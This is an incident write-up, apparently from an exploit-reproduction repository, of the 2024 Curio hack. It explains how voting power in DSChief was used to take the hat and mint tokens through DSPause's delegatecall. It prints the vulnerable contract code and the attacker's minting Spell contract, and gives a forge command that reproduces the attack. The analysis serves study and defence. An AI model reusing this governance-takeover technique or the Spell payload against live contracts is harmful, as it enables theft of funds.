# Curio Public Mint
- **Type:** Exploit
- **Network:** Ethereum 
- **Total lost**: ~16MM USD 
- **Category:** Access Control
- **Vulnerable contracts:**
- - [Curio Chief](https://etherscan.io/address/0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0#code)
- - [Curio Pause](https://etherscan.io/address/0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f#code)

- **Attack transactions:**
- - [Privilege escalation and mint](https://etherscan.io/tx/0x4ff4028b03c3df468197358b99f5160e5709e7fce3884cc8ce818856d058e106)
  
- **Attacker Addresses**: 
- - Attacker EOA: [0xdaAa6294C47b5743BDafe0613d1926eE27ae8cf5](https://etherscan.io/address/0xdaAa6294C47b5743BDafe0613d1926eE27ae8cf5)
- - Attacker Contract (verified): [0x1E791527AEA32cDDBD7CeB7F04612DB536816545](https://etherscan.io/address/0x1E791527AEA32cDDBD7CeB7F04612DB536816545)
  
- **Attack Block:**:  `19,498,911`  
- **Date:** Mar 23, 2024
- **Reproduce:** `forge test --match-contract=Exploit_Curio -vvv`

## Step-by-step 
1. The attacker locked tokens into the DSChief contract.
2. The attacker accumulated enough voting power .
3. The attacker displaced (lifted) the current hat and set their contract as the new hat (without requiring many tokens).
4. The DSPause contract, upon making a `delegatecall`, checked DSChief.canCall, which returned true for the attacker's contract.
5. Consuming the authorized minter role of DSPause, the attacker executed a malicious instructions through a custom `Spell` contract to mint tokens directly to themselves.


## Detailed Description
Curio Finance leverages MakerDAO contracts for managing specific protocol functionalities. Their CSC Curio token, a `DSToken`, designates the `DSPauseProxy` contract as its minter. The `DSPause` contract relies on `DSChief.canCall` to verify if an authorized (privileged) call is permitted.
Then, executes a `delegatecall` through its proxy.

The operational vulnerability resided in the `DSChief` contract, which manages a HAT account that can be reconfigured with sufficient voting power. The attacker exploited this by locking tokens in `DSChief`, getting enough votes to lift and displace the current hat, subsequently positioning their contract as the new hat. The main issue was that the current hat did not have enough voting power which allowed the easy displacement. 

The attacker was able to displace the `hat` by making the following calls on [chief.sol](https://github.com/CurioTeam/ds-chief/blob/simplify/src/chief.sol).

- Get initial voting weight.
```solidity
    function lock(uint128 wad)
        note
    {
        GOV.pull(msg.sender, wad);
        IOU.mint(wad);
        IOU.push(msg.sender, wad);
        deposits[msg.sender] = wadd(deposits[msg.sender], wad);
        addWeight(wad, votes[msg.sender]);
    }

    function addWeight(uint128 weight, bytes32 slate)
        internal
    {
        var yays = slates[slate];
        for( uint i = 0; i < yays.length; i++) {
            approvals[yays[i]] = wadd(approvals[yays[i]], weight);
        }
    }
```

```solidity
    function vote(bytes32 slate)
        note
    {
        uint128 weight = deposits[msg.sender];
        subWeight(weight, votes[msg.sender]);
        votes[msg.sender] = slate;
        addWeight(weight, votes[msg.sender]);
    }
```

- Displace the previous hat:
```solidity
    function lift(address whom)
        note
    {
        require(approvals[whom] > approvals[hat]);
        hat = whom;
    }
```

Since the authorized minter of the CSC Token is the `DSPauseProxy` which is controlled by the `DSPause` contract, by getting enough privileges through
the escalation made on the Chief the attacker was able to make the arbitrary `delegatecall` from the proxy.

- [`roles.sol`](https://github.com/dapphub/ds-roles/blob/495863375b87efe062eb3b723e6a199633ec7e51/src/roles.sol#L40):

These function were called from the pause contract to validate the caller's privileges.
```solidity
    function canCall(address caller, address code, bytes4 sig)
        constant
        returns (bool)
    {
        if( isUserRoot(caller) || isCapabilityPublic(code, sig) ) {
            return true;
        } else {
            var has_roles = getUserRoles(caller);
            var needs_one_of = getCapabilityRoles(code, sig);
            return bytes32(0) != has_roles & needs_one_of;
        }
    }
```

- `chief.sol`:
```solidity
    function isUserRoot(address who)
        constant
        returns (bool)
    {
        return (who == hat);
    }
```

- [`pause.sol`](https://github.com/CurioTeam/ds-pause/blob/solc-0.5-0.6/src/pause.sol):

```solidity
    modifier auth {
        require(isAuthorized(msg.sender, msg.sig), "ds-auth-unauthorized");
        _;
    }

    function isAuthorized(address src, bytes4 sig) internal view returns (bool) {
        if (src == address(this)) {
            return true;
        } else if (src == owner) {
            return true;
        } else if (authority == address(0)) {
            return false;
        } else {
            return DSAuthority(authority).canCall(src, address(this), sig);
        }
    }
```

The following functions were used to enqueue and call for the execution on `DSPause`.
```solidity
    function plot(address usr, bytes32 tag, bytes memory fax, uint eta)
        public note auth
    {
        require(eta >= add(now, delay), "ds-pause-delay-not-respected");
        plans[hash(usr, tag, fax, eta)] = true;
    }
```

```solidity
    function exec(address usr, bytes32 tag, bytes memory fax, uint eta)
        public note
        returns (bytes memory out)
    {
        require(plans[hash(usr, tag, fax, eta)], "ds-pause-unplotted-plan");
        require(soul(usr) == tag,                "ds-pause-wrong-codehash");
        require(now >= eta,                      "ds-pause-premature-exec");

        plans[hash(usr, tag, fax, eta)] = false;

        out = proxy.exec(usr, fax);
        require(proxy.owner() == address(this), "ds-pause-illegal-storage-change");
    }
```

Finally, make the `delegatecall` from the `DSPauseProxy`:

```solidity
    function exec(address usr, bytes memory fax)
        public auth
        returns (bytes memory out)
    {
        bool ok;
        (ok, out) = usr.delegatecall(fax);
        require(ok, "ds-pause-delegatecall-error");
    }
```

Upon making that `delegatecall`, `DSPause` verifies through `DSChief.canCall`, which returned true given the attacker's contract was now the hat. Since `DSPause` executes actions with delegatecall and possessed minting authority for the token, the attacker deployed a malicious custom `Spell` contract to mint tokens directly to their address. 

- `Spell` contract:
```solidity
    function act(address user, IMERC20 cgt) public {
        IVat vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
        IJoin daiJoin = IJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);

        vat.suck(address(this), address(this), 10 ** 9 * 10 ** 18 * 10 ** 27);

        vat.hope(address(daiJoin));
        daiJoin.exit(user, 10 ** 9 * 1 ether);

        cgt.mint(user, 10 ** 12 * 1 ether);
    }
```

Then, the attacker made multiple swaps and cross-chain transfers using different providers.

## Possible mitigations

## Sources and references
- [Curio Tweet](https://twitter.com/curio_invest/status/1771635979192774674)
- [Hacken Tweet](https://x.com/hackenclub/status/1772288824799801401)
- [Rekt Article](https://rekt.news/curio-rekt/)
